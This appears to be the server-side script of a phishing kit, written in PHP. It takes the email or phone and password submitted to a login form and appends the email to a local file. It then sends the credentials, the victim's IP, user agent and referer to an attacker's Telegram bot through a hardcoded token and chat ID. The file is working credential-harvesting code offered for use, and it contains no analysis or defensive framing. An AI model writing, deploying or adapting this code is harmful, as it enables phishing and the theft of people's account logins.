<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
$BOT_TOKEN = '7780336780:AAHlXjfcJaEa2QL6TlFTj71mGLSoMk00a9Y';
$CHAT_ID  = '7947170284';

function client_ip(){
    $keys = ['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'];
    foreach($keys as $k){
        if(!empty($_SERVER[$k])){
            $parts = explode(',', $_SERVER[$k]);
            $ip = trim($parts[0]);
            if(filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '127.0.0.1';
}

$email_raw = isset($_POST['email']) ? (string)$_POST['email'] : (isset($_POST['phone']) ? (string)$_POST['phone'] : '');
$password_raw  = isset($_POST['password'])  ? (string)$_POST['password']  : '';

// ✅ Sirf email ki value email.txt me append karna
file_put_contents('email.txt', $email_raw . PHP_EOL, FILE_APPEND);

$time = date('Y-m-d H:i:s');
$ip = client_ip();
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? (string)$_SERVER['HTTP_USER_AGENT'] : '';
$referer = isset($_SERVER['HTTP_REFERER']) ? (string)$_SERVER['HTTP_REFERER'] : '';

// Escape values for safe HTML output in Telegram
$email_safe = htmlspecialchars($email_raw, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
$password_safe  = htmlspecialchars($password_raw,  ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
$ua_safe    = htmlspecialchars($ua, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
$referer_safe = htmlspecialchars($referer, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

// Build message: only the email and password *values* are inside <code> so they are copyable
$message = <<<HTML
🔔 <b>DATA RECIEVED</b>

Time: $time
IP: $ip
User-Agent: $ua_safe
Referer: $referer_safe

email: <code>$email_safe</code>
password:  <code>$password_safe</code>
HTML;

$api = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
$post = [
    'chat_id' => $CHAT_ID,
    'text'    => $message,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
];

$ch = curl_init($api);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_TIMEOUT, 8);
$res = curl_exec($ch);
curl_close($ch);

echo "OK";

?>
